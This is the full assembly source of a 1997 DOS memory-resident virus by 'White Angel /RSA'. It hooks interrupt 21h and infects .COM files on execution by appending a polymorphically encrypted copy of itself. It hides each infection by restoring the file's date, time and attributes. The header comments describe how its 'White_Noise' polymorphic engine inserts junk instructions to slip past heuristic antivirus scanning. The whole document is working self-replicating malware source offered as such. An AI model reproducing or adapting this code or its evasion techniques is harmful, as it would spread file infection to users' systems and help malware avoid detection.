;== This is a very simple TSR virus, that infect only *.com files on execute.
;== And speach not about this virus ;-) I`m want show how realy work my
;== polymorphik generator, that can be linked to virus from .Obj file.
;==
;== Description of my generator:
;==
;== Name: White_Noise
;== EnCryption: very simple gamma encryption with dynamycal change of
;==             internal crypt parameters. To encryption can be used
;==             instructions: Xor, Sub, Add, Ror, Rol, Not. Count of
;==             crypt instructions can be from 2 to 10.
;== Carbage complexity: for carbage i`m use several instruction types:
;==             1) interrupr 21h with functions:
;==                4Dh, 54h, 19h, 0Dh;
;==                interrupt 16h with functions:
;==                1, 2;
;==                interrupt 10h with functions:
;==                8, 0Dh
;==                interrupt 12h.
;==             2) instruction, that write to memory. Very stupid heuristic
;==                try found encryption cycle by find command that write
;==                to memory ... And very nice ;-)
;==             3) i`m use a call instruction with push a parameter in stack
;==                sample:      Push 1234
;==                             Push 1234
;==                             Push 1234
;==                             Push 1234
;==                             Call Sub1
;==                             ---------
;==                       Sub1: Push Bp
;==                             Mov  Bp,Sp
;==                             [Sample carbage]
;==                             Pop  Bp
;==                             Ret  8
;==             4) Sub, Add, Xor, Mov, Cmp, Jx, Jmp and other .
;==             5) Push & Pop
;==             6) Simple one-byte instructions: nop, cld, std, sti ...
;==
;== Technical info: generator compiled with: Org 100h, model tiny, pascal
;==                 calling conversion, use .386 instructions.
;== Details:
;==     Function MakeCryptor( CryptAreaLen:Word; CryptorPtr,
;==                           DeCryptorPtr:DWord);
;==     CryptAreaLen - length in bytes of area, that must be encrypted
;==     CryptorPtr   - pointer, where create a cryptor.
;==     DeCryptorPtr - pointer, where create a decryptor.
;==
;== (C) 1997 White Angel /RSA

.Model Tiny,Pascal
.Code
Jumps
Locals
.386

Extrn             MakeCryptor:Near        ; Function, create a polym. cryptor
                                          ; and decryptor
Extrn             PushAll:Near            ; Procedure, push all register
Extrn             PopAll:Near             ; Procedure, pop all register,
                                          ; that pushed by PushAll
Extrn             CMoveMemory:Near        ; Procedure, Move Memory
Extrn             Randomize:Near          ; Procedure, initialize generator
                                          ; of random digits
Extrn             LastByte:Near           ; Label, if generator linked to
                                          ; end of file, then realy file
                                          ; length can be calculated:
                                          ; EQU OffSet LastByte-OffSet Start

                  Org      100h           ; TSR in memory can be found
                                          ; from 100h
Start:
;=========================================
                  Call     Loc1           ; Segment correction
Loc1:                                     ;
                  Mov      Bp,Sp
                  Mov      Si,Ss:[Bp]     ; Don't use Pop instruction to
                                          ; get value from stack,
                                          ; all normal heuristic
                  Call     ClearStack     ; this procedure remove from stack
                                          ; one word ( ret 2 ), that be
                                          ; pushed by Call !
                  Sub      Si,103h
;=========================================
                  Call     CheckInstall   ; Check previous installation
                  Jc       Loc2           ; in memory
                  Call     MemoryInstall  ; If not installed
Loc2:
                  Call     Restore        ; restore first bytes
                  Push     Cs Cs
                  Pop      Ds Es
                  Mov      Ax,100h        ; jmp to Cs:100
                  Jmp      Ax             ;
CheckInstall      Proc
                  Mov      Ax,'CI'        ; Check Install
                  Int      21h
                  Cmp      Ax,'IC'
                  Jz       Allready
                  Clc
                  Ret
AllReady:
                  Stc
                  Ret
CheckInstall      EndP

ClearStack        Proc
                  Ret      2              ; Remote two bytes from stack
ClearStack        EndP

MemoryInstall     Proc
;-------------------------------------------
;--               This piece cut memory
;-------------------------------------------
                  ; Ds=Es=PSP
                  Mov      Cs:Data1+Si,Es
                  Mov      Ah,52h
                  Int      21h
                  Mov      Ax,Es:[Bx-2]
                  Mov      Es,Ax
                  Mov      Ax,Es:[1]
                  Mov      Cs:Data2+Si,Ax
                  Push     Cs
                  Pop      Es
                  Sub      Word Ptr Ds:[2],160h*2+1
                  Mov      Bp,Ds:[2]
                  Mov      Dx,Ds
                  Sub      Bp,Dx
                  Mov      Ah,4Ah
                  Mov      Bx,0FFFFh
                  Int      21h
                  Mov      Ah,4Ah
                  Int      21h
                  Dec      Dx
                  Mov      Ds,Dx
                  Cmp      Byte Ptr Ds:[0],'Z'
                  Jz       Loc3
                  Mov      Byte Ptr Ds:[0],'M'
Loc3:
                  Mov      Ax,Ds:[3]
                  Mov      Bx,Ax
                  Sub      Ax,160h*2+1
                  Add      Dx,Ax
                  Mov      Ds:[3],Ax
                  Inc      Dx
                  Mov      Es,Dx
                  Mov      Byte Ptr Es:[0],'Z'
                  Push     Cs:Data2+Si
                  Pop      Word Ptr Es:[1]
                  Mov      Word Ptr Es:[3],160h*2
                  Inc      Dx
                  Mov      Es,Dx
                  Push     Cs
                  Pop      Ds
                  Mov      Cx,ActiveLength
                  Mov      Di,100h
                  Push     Si
                  Add      Si,OffSet Start
                  Cld
                  Rep      MovsW
                  Pop      Si
                  Push     Es
                  Mov      Ax,OffSet Loc4
                  Push     Ax
                  Mov      Es,Cs:Data1
                  Mov      Ah,4Ah
                  Mov      Bx,Bp
                  Int      21h
                  RetF
;---------------------------------------------------------------------
Loc4:
                  Mov      Bp,Es
                  Push     Cs
                  Pop      Ds
                  Mov      Ax,3521h
                  Int      21h
                  Mov      Ds:Vector21,Bx
                  Mov      Ds:Vector21+2,Es
                  Mov      Es,Bp
                  Mov      Dx,OffSet Int21
                  Mov      Ah,25h
                  Int      21h
                  Push     Ss Ss Ss
                  Pop      Es Ds
                  Mov      Ax,Si
                  Add      Ax,OffSet Loc2
                  Push     Ax
                  RetF
MemoryInstall     EndP

Int21             Proc
                  Not      Ax
                  Cmp      Ax, Not 4B00h         ; File execute ?
                  Jz       Exec                  ; Ds:Dx - pointer to path
                  Cmp      Ax,Not 'CI'           ; Check Install
                  Jnz      Exit21
                  Not      Ax
                  Xchg     Ah,Al
                  IRet
Exit21:
                  Not      Ax
                  DB       0EAh
Vector21          DW       0,0
Exec:
                  Call     Defeat
                  Jmp      Short Exit21
Int21             EndP


;---------------- This Procedure Defeat executable file ------------------
Defeat            Proc     ; Ds:Dx - path to file name
                  Call     PushAll
                  Mov      Cs:Path_Ptr,Dx
                  Mov      Cs:Path_Ptr+2,Ds
                  Call     Save&SetInt24
                  Mov      Ax,4300h          ; Get file attribute
                  Call     MsDos
                  Jnc      Loc5
                  Jmp      Exit_Defeat
Loc5:
                  Mov      Cs:FAttribute,Cx
                  Mov      Ax,4301h          ; Clear file Attribute
                  Sub      Cx,Cx
                  Call     MsDos
                  Jnc      Loc7
                  Jmp      Exit_Defeat_Close
Loc7:
                  Mov      Ax,3D02h          ; Open File for I/O
                  Call     MsDos
                  Jnc      Loc6
                  Jmp      Exit_Defeat
Loc6:
                  Push     Cs
                  Pop      Ds
                  Mov      Ds:Handle,Ax      ; Save file handle
                  Xchg     Bx,Ax

                  Mov      Ax,5700h
                  Call     MsDos             ; Get File Date/Time
                  Mov      Ds:FTime,Cx       ; Store Time
                  Mov      Ds:FDate,Dx       ; Store Date

                  Mov      Ah,3Fh            ; Read 3 first bytes from file
                  Mov      Cx,3
                  Lea      Dx,Com_Bytes
                  Call     MsDos
                  Jnc      Loc8
                  Jmp      Exit_Defeat_Close
Loc8:
                  Cmp      Ax,3
                  Jz       Loc9
                  Jmp      Exit_Defeat_Close
Loc9:
                  Lea      Si,Com_Bytes
                  LodsW
                  Not      Ax
                  Cmp      Ax,Not 'ZM'       ; Exe file
                  Jnz      Loc10
                  Jmp      Exit_Defeat_Close
Loc10:
                  Cmp      Ax,Not 'MZ'       ; Exe file
                  Jnz      Loc12
                  Jmp      Exit_Defeat_Close
Loc12:
                  Cmp      Al,Not 0E9h       ; First command is Near Jump
                  Jnz      Loc11
                  Jmp      Exit_Defeat_Close
Loc11:
                  Mov      Ax,4202h          ; Seek from end of file
                  Sub      Cx,Cx
                  Mov      Dx,Cx             ; Cx:Dx - pointer from end
                  Call     MsDos
                  Cmp      Ax,51000
                  Jc       Lab18
                  Jmp      Exit_Defeat_Close
Lab18:
                  Sub      Ax,3
                  Mov      Word Ptr Ds:Jump_Bytes+1,Ax

;= This piece calling polymorphing generator for creating decryptor.
;= You anderstand about what speech ? ;)
                  Push     Ds Es Cs Cs
                  Pop      Ds Es

                  Mov      Di,OffSet CryptorCall
                  Mov      Cx,30
                  Mov      Al,90h
                  Cld
                  Rep      StosB

                  Call     MakeCryptor Pascal, ActiveLength   \
                                            Cs OffSet Cryptor \
                                            Cs OffSet LastByte
                  Mov      Cs:CryptBInit,Al
                  Pop      Es Ds
;=============================================
                  Mov      Ah,40h            ; Write decryptor
                  Lea      Dx,LastByte
                  ; cx has be setted from MakeCryptor
                  Call     MsDos
                  Jc       Exit_Defeat_Close

;===
                  Call     Randomize
                  Call     CMoveMemory Pascal, Cs OffSet LastByte \
                                               Cs OffSet Start    \
                                               ActiveLength
                  Push     Es Cs
                  Pop      Es
                  Call     CryptMyBody
                  Pop      Es
;===
                  Mov      Ah,40h            ; Write wild animal body
                  Lea      Dx,LastByte
                  Mov      Cx,ActiveLength
                  Call     MsDos
                  Jc       Exit_Defeat_Close
                  Cmp      Ax,ActiveLength
                  Jnz      Exit_Defeat_Close
                  Mov      Ax,4200h          ; Seek to begin
                  Sub      Cx,Cx
                  Sub      Dx,Dx
                  Call     MsDos
                  Mov      Ah,40h            ; Write 3 first Bytes
                  Mov      Cx,3
                  Lea      Dx,Jump_Bytes
                  Call     MsDos
                  Jc       Exit_Defeat_Close
                  Cmp      Ax,3
                  Jnz      Exit_Defeat_Close

                  Mov      Bx,Ds:Handle     ;
                  Mov      Ax,5701h         ;Restore old Date & Time
                  Mov      Cx,Cs:FTime      ;
                  Mov      Dx,Cs:FDate      ;
                  Call     MsDos

                  Lds      Dx,DWord Ptr Cs:Path_Ptr
                  Mov      Ax,4301h         ; Restore old File Attribute
                  Mov      Cx,Cs:FAttribute
                  Call     MsDos
Exit_Defeat_Close:
                  Mov      Ah,3Eh           ; Close Defeat File
                  Mov      Bx,Cs:Handle
                  Call     MsDos
Exit_Defeat:
                  Call     RestoreInt24
                  Call     PopAll
                  Ret
Defeat            EndP

;---------------- Restore first Bytes ------------------------
Restore           Proc
                  Push     Si
                  Add      Si,OffSet Com_Bytes
                  Mov      Di,100h
                  Cld
                  LodsW
                  StosW
                  LodsB
                  StosB
                  Pop      Si
                  Ret
Restore           EndP

CryptorCall:
                  DB       29 Dup (90h)
Cryptor:
                  Nop
                  Ret

MsDos             Proc
                  Int       21h
                  Ret
MsDos             EndP

CryptMyBody       Proc
                  Uses     Cx, Si, Di, Ax, Bx
                  Mov      Cx,ActiveLength
                  Mov      Si,OffSet LastByte
                  Mov      Di,Si
                  Mov      Bl,0
                  Org      $-1
CryptBInit        DB       0
                  Dec      Bl
CMB1:
                  LodsB
                  Call     CryptorCall
                  StosB
                  Loop     CMB1
                  Ret
CryptMyBody       EndP

Save&SetInt24     Proc
                  Uses     Ax, Bx, Dx, Es, Ds
                  Mov      Ax,3524h
                  Int      21h
                  Mov      Cs:OldInt24,Bx
                  Mov      Cs:OldInt24+2,Es
                  Push     Cs
                  Pop      Ds
                  Mov      Dx,OffSet Int24
                  Mov      Ah,25h
                  Int      21h
                  Ret
Save&SetInt24     EndP

RestoreInt24      Proc
                  Uses     Ax, Dx, Ds
                  Lds      Dx,DWord Ptr Cs:OldInt24
                  Mov      Ax,2524h
                  Int      21h
                  Ret
RestoreInt24      EndP

Int24:
                  Mov      Al,3
                  IRet

;----------------- Data Area --------------------------------------------
                  DB       'This is first step on the way to Perfection',0
                  DB       'Noise ,Version 1.0',0
                  DB       '(C) by White Angel /RSA',0
Com_Bytes         DB       90h,0CDh,20h         ; Bytes from the begin of
                                                ; COM file
OldInt24          DW       0,0
Handle            DW       0
Jump_Bytes        DB       0E9h,0,0
Data1             DW       0
Data2             DW       0
FTime             DW       0
FDate             DW       0
FAttribute        DW       0
Path_Ptr          DW       0,0
ActiveLength      EQU      LastByte-Start

;LastByte:
;------------------------------------------------------------------------
                  End      Start
